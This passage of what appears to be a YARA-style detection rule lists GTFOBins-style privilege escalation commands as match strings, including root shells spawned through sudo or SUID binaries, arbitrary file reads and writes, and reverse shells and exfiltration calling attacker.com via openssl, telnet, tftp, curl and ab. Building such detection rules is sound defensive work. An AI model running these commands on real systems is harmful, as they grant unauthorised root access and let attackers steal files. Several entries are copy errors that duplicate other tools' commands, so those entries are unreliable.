        $gtfo_function_sudo_redcarpet = "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
        $gtfo_function_sudo_restic = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
        $gtfo_function_sudo_rev = "LFILE=file_to_read\nsudo rev $LFILE | rev\n" 
        $gtfo_function_sudo_rlwrap = "sudo rlwrap /bin/sh"
        $gtfo_function_sudo_rpm_1 = "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
        $gtfo_function_sudo_rpm_2 = "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
        $gtfo_function_sudo_rpmdb = "sudo rpmdb --eval '%(/bin/sh 1>&2)'" 
        $gtfo_function_sudo_rpmquery = "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'" 
        $gtfo_function_sudo_rpmverify = "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
        $gtfo_function_sudo_rsync = "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        $gtfo_function_sudo_ruby = "sudo ruby -e 'exec \"/bin/sh\"'"
        $gtfo_function_sudo_run_mailcap = "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
        $gtfo_function_sudo_run_parts = "sudo run-parts --new-session --regex '^sh$' /bin" 
        $gtfo_function_sudo_runscript = "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
        $gtfo_function_sudo_rview_1 = "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_rview_2 = "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
        $gtfo_function_sudo_rvim_1 = "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_rvim_2 = "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
        $gtfo_function_sudo_sash = "sudo sash"
        $gtfo_function_sudo_scanmem = "sudo scanmem\nshell /bin/sh\n"
        $gtfo_function_sudo_scp = "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
        $gtfo_function_sudo_screen = "sudo screen"
        $gtfo_function_sudo_script = "sudo script -q /dev/null"
        $gtfo_function_sudo_scrot = "sudo scrot -e /bin/sh"
        $gtfo_function_sudo_sed = "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
        $gtfo_function_sudo_service = "sudo service ../../bin/sh"
        $gtfo_function_sudo_setarch = "sudo setarch $(arch) /bin/sh"
        $gtfo_function_sudo_setfacl = "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
        $gtfo_function_sudo_setlock = "sudo setlock - /bin/sh"
        $gtfo_function_sudo_sftp = "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
        $gtfo_function_sudo_sg = "sudo sg root\n"
        $gtfo_function_sudo_shuf = "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
        $gtfo_function_sudo_slsh = "sudo slsh -e 'system(\"/bin/sh\")'"
        $gtfo_function_sudo_smbclient = "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
        $gtfo_function_sudo_snap = "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
        $gtfo_function_sudo_socat = "sudo socat stdin exec:/bin/sh\n"
        $gtfo_function_sudo_soelim = "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n" 
        $gtfo_function_sudo_softlimit = "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
        $gtfo_function_sudo_sort = "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
        $gtfo_function_sudo_split = "sudo split --filter=/bin/sh /dev/stdin\n"
        $gtfo_function_sudo_sqlite3 = "sudo sqlite3 /dev/null '.shell /bin/sh'"
        $gtfo_function_sudo_sqlmap = "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
        $gtfo_function_sudo_ss = "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
        $gtfo_function_sudo_ssh = "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
        $gtfo_function_sudo_ssh_agent = "sudo ssh-agent /bin/"
        $gtfo_function_sudo_ssh_keygen = "sudo ssh-keygen -D ./lib.so"
        $gtfo_function_sudo_ssh_keyscan = "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
        $gtfo_function_sudo_sshpass = "sudo sshpass /bin/sh"
        $gtfo_function_sudo_start_stop_daemon = "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
        $gtfo_function_sudo_stdbuf = "sudo stdbuf -i0 /bin/sh"
        $gtfo_function_sudo_strace = "sudo strace -o /dev/null /bin/sh"
        $gtfo_function_sudo_strings = "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
        $gtfo_function_sudo_su = "sudo su"
        $gtfo_function_sudo_sudo = "sudo sudo /bin/sh"
        $gtfo_function_sudo_sysctl = "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
        $gtfo_function_sudo_systemctl_1 = "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"
        $gtfo_function_sudo_systemctl_2 = "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"
        $gtfo_function_sudo_systemctl_3 = "sudo systemctl\n!sh\n"
        $gtfo_function_sudo_systemd_resolve = "sudo systemd-resolve --status\n!sh\n"
        $gtfo_function_sudo_tac = "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
        $gtfo_function_sudo_tail = "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
        $gtfo_function_sudo_tar = "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        $gtfo_function_sudo_task = "sudo task execute /bin/sh"
        $gtfo_function_sudo_taskset = "sudo taskset 1 /bin/sh"
        $gtfo_function_sudo_tasksh = "sudo tasksh\n!/bin/sh\n"
        $gtfo_function_sudo_tbl = "LFILE=file_to_read\nsudo tbl $LFILE\n"
        $gtfo_function_sudo_tclsh = "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
        $gtfo_function_sudo_tcpdump = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
        $gtfo_function_sudo_tdbtool = "sudo tdbtool\n! /bin/sh\n"
        $gtfo_function_sudo_tee = "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
        $gtfo_function_sudo_telnet = "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n" 
        $gtfo_function_sudo_terraform = "sudo terraform console\nfile(\"file_to_read\")\n" 
        $gtfo_function_sudo_tex = "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
        $gtfo_function_sudo_tftp = "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
        $gtfo_function_sudo_tic = "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
        $gtfo_function_sudo_time = "sudo /usr/bin/time /bin/sh"
        $gtfo_function_sudo_timedatectl = "sudo timedatectl list-timezones\n!/bin/sh\n"
        $gtfo_function_sudo_timeout = "sudo timeout --foreground 7d /bin/sh"
        $gtfo_function_sudo_tmate = "sudo tmate -c /bin/sh"
        $gtfo_function_sudo_tmux = "sudo tmux"
        $gtfo_function_sudo_top = "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
        $gtfo_function_sudo_torify = "sudo torify /bin/sh"
        $gtfo_function_sudo_torsocks = "sudo torsocks /bin/sh"
        $gtfo_function_sudo_troff = "LFILE=file_to_read\nsudo troff $LFILE\n"
        $gtfo_function_sudo_ul = "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
        $gtfo_function_sudo_unexpand = "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
        $gtfo_function_sudo_uniq = "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
        $gtfo_function_sudo_unshare = "sudo unshare /bin/sh"
        $gtfo_function_sudo_unsquashfs = "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
        $gtfo_function_sudo_unzip = "sudo unzip -K shell.zip\n./sh -p\n"
        $gtfo_function_sudo_update_alternatives = "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n" 
        $gtfo_function_sudo_uudecode = "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
        $gtfo_function_sudo_uuencode = "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
        $gtfo_function_sudo_vagrant = "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
        $gtfo_function_sudo_valgrind = "sudo valgrind /bin/sh"
        $gtfo_function_sudo_varnishncsa = "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
        $gtfo_function_sudo_vi = "sudo vi -c ':!/bin/sh' /dev/null"
        $gtfo_function_sudo_view_1 = "sudo view -c ':!/bin/sh'"
        $gtfo_function_sudo_view_2 = "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_view_3 = "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
        $gtfo_function_sudo_vigr = "sudo vigr"
        $gtfo_function_sudo_vim_1 = "sudo vim -c ':!/bin/sh'"
        $gtfo_function_sudo_vim_2 = "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_vim_3 = "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_vimdiff_1 = "sudo vimdiff -c ':!/bin/sh'"
        $gtfo_function_sudo_vimdiff_2 = "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_sudo_vimdiff_3 = "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
        $gtfo_function_sudo_vipw = "sudo vipw"
        $gtfo_function_sudo_virsh = "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
        $gtfo_function_sudo_w3m = "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
        $gtfo_function_sudo_wall = "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
        $gtfo_function_sudo_watch = "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
        $gtfo_function_sudo_wc = "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
        $gtfo_function_sudo_wget = "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
        $gtfo_function_sudo_whiptail = "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
        $gtfo_function_sudo_wireshark = "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
        $gtfo_function_sudo_wish = "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
        $gtfo_function_sudo_xargs = "sudo xargs -a /dev/null sh"
        $gtfo_function_sudo_xdg_user_dir = "sudo xdg-user-dir '}; /bin/sh #'\n"
        $gtfo_function_sudo_xdotool = "sudo xdotool exec --sync /bin/sh"
        $gtfo_function_sudo_xelatex_1 = "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
        $gtfo_function_sudo_xelatex_2 = "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        $gtfo_function_sudo_xetex = "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
        $gtfo_function_sudo_xmodmap = "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
        $gtfo_function_sudo_xmore ="LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n" 
        $gtfo_function_sudo_xpad = "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
        $gtfo_function_sudo_xxd = "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
        $gtfo_function_sudo_xz = "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
        $gtfo_function_sudo_yarn = "sudo yarn exec /bin/sh"
        $gtfo_function_sudo_yash = "sudo yash"
        $gtfo_function_sudo_yum_1 = "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"
        $gtfo_function_sudo_yum_2 = "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
        $gtfo_function_sudo_zathura = "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
        $gtfo_function_sudo_zip = "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
        $gtfo_function_sudo_zsh = "sudo zsh"
        $gtfo_function_sudo_zsoelim = "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
        $gtfo_function_sudo_zypper_1 = "sudo zypper x\n"
        $gtfo_function_sudo_zypper_2 = "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
        // suid
        $gtfo_function_suid_aa_exec = "./aa-exec /bin/sh -p"
        $gtfo_function_suid_ab = "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
        $gtfo_function_suid_agetty = "./agetty -o -p -l /bin/sh -a root tty"
        $gtfo_function_suid_alpine = "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
        $gtfo_function_suid_ar = "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n" 
        $gtfo_function_suid_arj = "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n"
        $gtfo_function_suid_arp = "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
        $gtfo_function_suid_as = "LFILE=file_to_read\n./as @$LFILE\n"
        $gtfo_function_suid_ascii_xfr = "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n" 
        $gtfo_function_suid_ash = "./ash"
        $gtfo_function_suid_aspell = "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
        $gtfo_function_suid_atobm = "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
        $gtfo_function_suid_awk = "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
        $gtfo_function_suid_base32 = "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
        $gtfo_function_suid_base64 = "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
        $gtfo_function_suid_basenc = "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
        $gtfo_function_suid_basez = "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
        $gtfo_function_suid_bash = "./bash -p"
        $gtfo_function_suid_bc = "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
        $gtfo_function_suid_bridge = "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
        $gtfo_function_suid_busctl = "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n"
        $gtfo_function_suid_busybox = "./busybox sh"
        $gtfo_function_suid_bzip2 = "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
        $gtfo_function_suid_cabal = "./cabal exec -- /bin/sh -p"
        $gtfo_function_suid_capsh = "./capsh --gid=0 --uid=0 --"
        $gtfo_function_suid_cat = "LFILE=file_to_read\n./cat \"$LFILE\"\n"
        $gtfo_function_suid_chmod = "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
        $gtfo_function_suid_choom = "./choom -n 0 -- /bin/sh -p"
        $gtfo_function_suid_chown = "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
        $gtfo_function_suid_chroot = "./chroot / /bin/sh -p\n"
        $gtfo_function_suid_clamscan = "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
        $gtfo_function_suid_cmp = "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
        $gtfo_function_suid_column = "LFILE=file_to_read\n./column $LFILE\n"
        $gtfo_function_suid_comm = "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
        $gtfo_function_suid_cp_1 = "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
        $gtfo_function_suid_cp_2 = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"
        $gtfo_function_suid_cp_3 = "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
        $gtfo_function_suid_cpio_1 = "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"
        $gtfo_function_suid_cpio_2 = "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
        $gtfo_function_suid_cpulimit = "./cpulimit -l 100 -f -- /bin/sh -p"
        $gtfo_function_suid_csh = "./csh -b"
        $gtfo_function_suid_csplit = "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
        $gtfo_function_suid_csvtool = "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
        $gtfo_function_suid_cupsfilter = "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
        $gtfo_function_suid_curl = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
        $gtfo_function_suid_cut = "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
        $gtfo_function_suid_dash =  "./dash -p"
        $gtfo_function_suid_date = "LFILE=file_to_read\n./date -f $LFILE\n"
        $gtfo_function_suid_dd = "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
        $gtfo_function_suid_debugfs = "./debugfs\n!/bin/sh\n"
        $gtfo_function_suid_dialog = "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
        $gtfo_function_suid_diff = "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
        $gtfo_function_suid_dig = "LFILE=file_to_read\n./dig -f $LFILE\n"
        $gtfo_function_suid_distcc = "./distcc /bin/sh -p"
        $gtfo_function_suid_dmsetup = "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
        $gtfo_function_suid_docker = "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        $gtfo_function_suid_dosbox = "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
        $gtfo_function_suid_ed = "./ed file_to_read\n,p\nq\n"
        $gtfo_function_suid_efax = "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
        $gtfo_function_suid_elvish = "./elvish"
        $gtfo_function_suid_emacs = "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
        $gtfo_function_suid_env = "./env /bin/sh -p" 
        $gtfo_function_suid_eqn = "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
        $gtfo_function_suid_espeak = "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
        $gtfo_function_suid_expand = "LFILE=file_to_read\n./expand \"$LFILE\"\n"
        $gtfo_function_suid_expect = "./expect -c 'spawn /bin/sh -p;interact'" 
        $gtfo_function_suid_file = "LFILE=file_to_read\n./file -f $LFILE\n"
        $gtfo_function_suid_find = "./find . -exec /bin/sh -p \\; -quit"
        $gtfo_function_suid_fish = "./fish"
        $gtfo_function_suid_flock = "./flock -u / /bin/sh -p"
        $gtfo_function_suid_fmt = "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
        $gtfo_function_suid_fold = "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
        $gtfo_function_suid_gawk = "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
        $gtfo_function_suid_gcore = "./gcore $PID"
        $gtfo_function_suid_gdb = "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
        $gtfo_function_suid_genie = "./genie -c '/bin/sh'"
        $gtfo_function_suid_genisoimage = "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
        $gtfo_function_suid_gimp = "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        $gtfo_function_suid_grep = "LFILE=file_to_read\n./grep '' $LFILE\n"
        $gtfo_function_suid_gtester = "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
        $gtfo_function_suid_gzip = "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
        $gtfo_function_suid_hd = "LFILE=file_to_read\n./hd \"$LFILE\"\n"
        $gtfo_function_suid_head = "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
        $gtfo_function_suid_hexdump = "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
        $gtfo_function_suid_highlight = "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
        $gtfo_function_suid_hping3 = "./hping3\n/bin/sh -p\n"
        $gtfo_function_suid_iconv = "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
        $gtfo_function_suid_install = "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
        $gtfo_function_suid_ionice = "./ionice /bin/sh -p"
        $gtfo_function_suid_ip_1 = "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"
        $gtfo_function_suid_ip_2 = "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
        $gtfo_function_suid_ispell = "./ispell /etc/passwd\n!/bin/sh -p\n"
        $gtfo_function_suid_jjs = "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
        $gtfo_function_suid_join = "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
        $gtfo_function_suid_jq = "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
        $gtfo_function_suid_jrunscript = "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
        $gtfo_function_suid_julia = "./julia -e 'run(`/bin/sh -p`)'\n" 
        $gtfo_function_suid_ksh = "./ksh -p"
        $gtfo_function_suid_ksshell = "LFILE=file_to_read\n./ksshell -i $LFILE\n"
        $gtfo_function_suid_kubectl = "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
        $gtfo_function_suid_ld_so = "./ld.so /bin/sh -p"
        $gtfo_function_suid_less = "./less file_to_read"
        $gtfo_function_suid_links = "LFILE=file_to_read\n./links \"$LFILE\"\n"
        $gtfo_function_suid_logsave = "./logsave /dev/null /bin/sh -i -p"
        $gtfo_function_suid_look = "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
        $gtfo_function_suid_lua = "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
        $gtfo_function_suid_make = "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n" 
        $gtfo_function_suid_mawk = "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
        $gtfo_function_suid_minicom = "./minicom -D /dev/null\n"
        $gtfo_function_suid_more = "./more file_to_read"
        $gtfo_function_suid_mosquitto = "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
        $gtfo_function_suid_msgattrib = "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
        $gtfo_function_suid_msgcat = "LFILE=file_to_read\n./msgcat -P $LFILE\n"
        $gtfo_function_suid_msgconv = "LFILE=file_to_read\n./msgconv -P $LFILE\n"
        $gtfo_function_suid_msgfilter = "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
        $gtfo_function_suid_msgmerge = "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
        $gtfo_function_suid_msguniq = "LFILE=file_to_read\n./msguniq -P $LFILE\n"
        $gtfo_function_suid_multitime = "./multitime /bin/sh -p"
        $gtfo_function_suid_mv = "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
        $gtfo_function_suid_nasm = "LFILE=file_to_read\n./nasm -@ $LFILE\n"
        $gtfo_function_suid_nawk = "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n" 
        $gtfo_function_suid_ncftp = "./ncftp\n!/bin/sh -p\n"
        $gtfo_function_suid_nft = "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
        $gtfo_function_suid_nice = "./nice /bin/sh -p"
        $gtfo_function_suid_nl = "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
        $gtfo_function_suid_nm = "LFILE=file_to_read\n./nm @$LFILE\n"
        $gtfo_function_suid_nmap = "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
        $gtfo_function_suid_node = "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
        $gtfo_function_suid_nohup = "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
        $gtfo_function_suid_ntpdate = "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n"
        $gtfo_function_suid_od = "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
        $gtfo_function_suid_openssl_1 = "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
        $gtfo_function_suid_openssl_2 = "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
        $gtfo_function_suid_openvpn_1 = "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
        $gtfo_function_suid_openvpn_2 = "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"
        $gtfo_function_suid_pandoc = "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
        $gtfo_function_suid_paste = "LFILE=file_to_read\npaste $LFILE\n"
        $gtfo_function_suid_perf = "./perf stat /bin/sh -p\n"
        $gtfo_function_suid_perl = "./perl -e 'exec \"/bin/sh\";'"
        $gtfo_function_suid_pexec = "./pexec /bin/sh -p" 
        $gtfo_function_suid_pg = "./pg file_to_read"
        $gtfo_function_suid_php = "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
        $gtfo_function_suid_pidstat = "COMMAND=id\n./pidstat -e $COMMAND\n"
        $gtfo_function_suid_pr = "LFILE=file_to_read\npr -T $LFILE\n"
        $gtfo_function_suid_ptx = "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
